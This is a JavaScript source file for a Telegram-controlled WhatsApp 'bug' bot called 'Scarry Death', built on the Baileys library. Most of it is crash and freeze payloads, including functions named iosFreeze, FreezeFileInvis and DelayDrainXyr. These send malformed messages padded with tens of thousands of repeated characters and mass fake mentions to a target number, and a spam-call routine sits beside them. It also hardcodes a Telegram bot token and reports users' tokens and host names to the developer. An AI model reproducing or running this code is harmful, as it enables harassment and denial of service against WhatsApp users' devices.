const {
  default: makeWAsocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WAsocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const os = require('os')
const httpMod = require('http')
const yts = require("yt-search")
const httpsMod = require('https')
const renlol = fs.readFileSync("./lib/Img/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "./Settings Scarry/cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./Settings Scarry/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./Database Scarry/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./Database Scarry/admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./Database Scarry/premium.json");
ensureFileExists("./Database Scarry/admin.json");

function escapeHtml(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
function savePremiumUsers() {
  fs.writeFileSync("./Database Scarry/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./Database Scarry/admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./Database Scarry/premium.json", (data) => (premiumUsers = data));
watchFile("./Database Scarry/admin.json", (data) => (adminUsers = data));

const bot = new TelegramBot(BOT_TOKEN, { polling: true })

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Raraaimupp/DatabaseRaraa/refs/heads/main/tokens.json"; //Isi raw github elu
const TELEGRAM_ALERT_ID = "1886007660";
const TELEGRAM_BOT_TOKEN = "8291816082:AAHs4o7BBYMB54trcFZ9mpp2DHzkSK92TVY";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens; // ambil dari object 'tokens'
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Key 'tokens' harus array"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("LU SIAPA NGENTOT!!!\nTOKEN LU GAK ADA DI DATABASE:", error.message));
    return [];
  }
}

// Validasi token
async function validateToken() {
  console.log(chalk.yellow("⏳ Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ LU SIAPA NGENTOD TOKEN LU GAK ADA DI DATABASE!!!"));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token Anda Terdaftar Di Database Scarry Death"));
  startBot();
}

// Fungsi startBot kalau token valid
function startBot() {
  console.log(chalk.yellow(`⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
BOT : CONNECTED
NAME SCRIPT : SCARRY DEATH
VERSION : 17.0 ℓтє
DEVELOPER : @raraa_imuppp
DEVELOPER 𝟐 : @Alxzystore
CHANNEL : @kepoluyee

Ubur-ubur ikan lele,
Pinjam seratus, le.😋
`));
}

async function sendBypassAlert(reason) {
  const idData = JSON.parse(fs.readFileSync("./ID.json"));
  const currentId = Object.keys(idData)[0];
  const time = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");
  const domain = process.env.HOSTNAME || os.hostname();

  const text = `
🚨 *PENCOBAAN BYPASS TERDETEKSI* 🚨
ID: ${currentId}
Token: \`${BOT_TOKEN}\`
Reason: ${reason}
Domain: ${domain}
Time: ${time}
`.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_ALERT_ID,
      text,
      parse_mode: "Markdown"
    });
    console.log("📤 Notifikasi bypass dikirim ke Telegram.");
  } catch (e) {
    console.error("❌ Gagal kirim notifikasi:", e.message);
  }
}

validateToken();

let sock = null;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWAsocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363400362472743@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
ⓘ 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘕𝘰𝘮𝘰𝘳  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWAsocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`︎
ⓘ 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘕𝘰𝘮𝘰𝘳 ${botNumber}.....
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `\`\`\`
ⓘ 𝘎𝘢𝘨𝘢𝘭 𝘔𝘦𝘭𝘢𝘬𝘶𝘬𝘢𝘯 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘒𝘦 𝘕𝘰𝘮𝘰𝘳  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`︎
ⓘ 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘒𝘦 𝘕𝘰𝘮𝘰𝘳 ${botNumber}..... 𝘚𝘶𝘤𝘤𝘦𝘴\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363400362472743@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`︎ⓘ𝘚𝘶𝘬𝘴𝘦𝘴 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘢𝘪𝘳𝘪𝘯𝘨\`\`\`
𝘠𝘰𝘶𝘳 𝘊𝘰𝘥𝘦 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `\`\`\`
ⓘ𝘎𝘢𝘨𝘢𝘭 𝘔𝘦𝘭𝘢𝘬𝘶𝘬𝘢𝘯 𝘗𝘢𝘪𝘳𝘪𝘯𝘨 𝘒𝘦 𝘕𝘰𝘮𝘰𝘳 ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://qu.ax/sZbfu.jpg",
    "https://qu.ax/LiJpL.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 3 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWAsocket
  const sock = makeWAsocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi Websocket
  }
}

//FUNCTION BUG
async function ZhTSenpai(jid) {
  try {
    const cardss = [];

    for (let i = 0; i < 50; i++) {
      cardss.push({
        header: {
          hasMediaAttachment: true,
          productMessage: {
            product: {
              productImage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
                fileLength: "999999999999999",
                height: 9999,
                width: 9999,
                mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
                fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
                directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1755695348",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/..."
              },
              productId: "9783476898425051",
              title: "Raraa Is Here" + "ê¦½".repeat(500),
              description: "ê¦½".repeat(500),
              currencyCode: "IDR",
              priceAmount1000: "X",
              retailerId: "BAN011",
              productImageCount: 2,
              salePriceAmount1000: "50000000"
            },
            businessOwnerJid: "6287875400190@s.whatsapp.net",
          }
        },
        body: { text: "Gw Raraa" + "ê¦½".repeat(5000) },
        nativeFlowMessage: {
          buttons: [
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                icon: "RIVIEW",
                flow_cta: "ê¦½".repeat(1000),
                flow_message_version: "3"
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                icon: "PROMOTION",
                flow_cta: "ê¦½".repeat(1000),
                flow_message_version: "3"
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                icon: "DOCUMENT",
                flow_cta: "ê¦½".repeat(1000),
                flow_message_version: "3"
              })
            }
          ],
          messageParamsJson: "{[".repeat(10000)
        }
      });
    }

    const content = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: jid,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              remoteJid: "X",
              participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              stanzaId: "123",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
              }
            },
            carouselMessage: {
              messageVersion: 1,
              cards: cardss
            }
          }
        }
      }
    };

    const msg1 = await sock.relayMessage(jid, content, {
      messageId: "",
      participant: { jid: jid },
      userJid: jid
    });

    const msg2 = await sock.relayMessage(jid, content, {
      messageId: "",
      participant: { jid: jid },
      userJid: jid
    });
    
    if (msg1?.key) await sock.sendMessage(jid, { delete: msg1.key });
    if (msg2?.key) await sock.sendMessage(jid, { delete: msg2.key });

    console.log(chalk.red(`ð­ðµð§ - ðð¹ð¼ðð¶ð»ð´ ð§ð¼ ${jid}`));
  } catch (err) {
    console.error("â Eror Tod:", err);
  }
}

async function Ati(jid) {
    console.log(chalk.blue(`🎯 Cod Delay Ke: ${jid}`));

    const massMentions = Array.from({ length: 1900 }, () => 
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    );
    massMentions.unshift(jid);

    const stickerData = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                    mimetype: "image/webp",
                    height: 9999,
                    width: 9999,
                    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                    fileLength: 12260,
                    mediaKeyTimestamp: "1743832131",
                    isAnimated: false,
                    stickerSentTs: Date.now(),
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                    contextInfo: {
                        participant: jid,
                        mentionedJid: massMentions,
                        remoteJid: "X",
                        stanzaId: "1234567890ABCDEF",
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimestamp: Date.now() + 1814400000
                            }
                        }
                    }
                }
            }
        }
    };

    const message = generateWAMessageFromContent(jid, stickerData, {});
    const useStatusBroadcast = Math.random() > 0.5;

    if (useStatusBroadcast) {
        await sock.relayMessage("status@broadcast", message.message, {
            messageId: message.key.id,
            statusJidList: [jid]
        });
    } else {
        await sock.relayMessage(jid, message.message, { 
            messageId: message.key.id 
        });
    }

    console.log(chalk.green(`✅ Send To ${jid}`));
}

async function iosFreeze(jid, Ptcp = true) {
   let anjayalokmwkakaakak = "palabapakkau" + "ြ".repeat(25000) + "@1".repeat(60000);
   await sock.relayMessage(jid, {
         messages: {
            Exentedtextmesage: {
               message: {
                  documentMessage: {
                     url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                     mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                     fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                     fileLength: "999999999",
                     pageCount: 0x9184e729fff,
                     mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                     fileName: "NtahMengapa..",
                     fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                     directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                     mediaKeyTimestamp: "1715880173",
                     contactVcard: true
                  },
                  title: "",
                  hasMediaAttachment: true
               },
               body: {
                  text: anjayalokmwkakaakak
               },
               nativeFlowMessage: {},
               contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "0@newsletter"),
          }
         }
      }
   }, { participant: { jid: mentionedJid, target } }, { messageId: null });
}

async function FreezeFileInvis(jid, Ptcp = true) {
    let anjays = "slayer" + "ြ".repeat(25000) + "@1".repeat(60000);
    await sock.relayMessage(jid, {
            message: {
                ViewOnceMessage: {
                    message: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "bapakkau",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: anjays
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "status@broadcast")
            }
          }
        }
    }, { participant: { jid: mentionedJid, jid } }, { messageId: null });
}

async function Sticker(jid) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        nativeFlowResponseMessage: {
          name: "StickerNativeFlow",
          paramsJson: JSON.stringify({
            stickerMessage: {
              fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
              fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
              mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
              mimetype: "image/webp",
              height: 9999,
              width: 9999,
              fileLength: 12260,
              mediaKeyTimestamp: "1743832131",
              isAnimated: false,
              isAvatar: false,
              isAiSticker: false,
              isLottie: false,
              stickerSentTs: Date.now(),
              contextInfo: {
                participant: jid,
                mentionedJid: [
                  jid,
                  ...Array.from(
                    { length: 1900 },
                    () =>
                      "1" +
                      Math.floor(Math.random() * 5000000) +
                      "@s.whatsapp.net"
                  ),
                ],
                remoteJid: "X",
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 3,
                    expiryTimestamp: Date.now() + 1814400000,
                  },
                },
              },
            },
          }),
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, stickerPayload, {});

  if (Math.random() > 0.5) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: jid }, content: undefined },
              ],
            },
          ],
        },
      ],
    });
  } else {
    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
  }
}

async function DelayDrainXyr(jid) {
const ForLong = "Xyraa4Zephrine" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "Xyraa4Zephrine" + ForLong,
            matchedText: "AlwaysZephrine",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "Xyraa4Zephrine" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
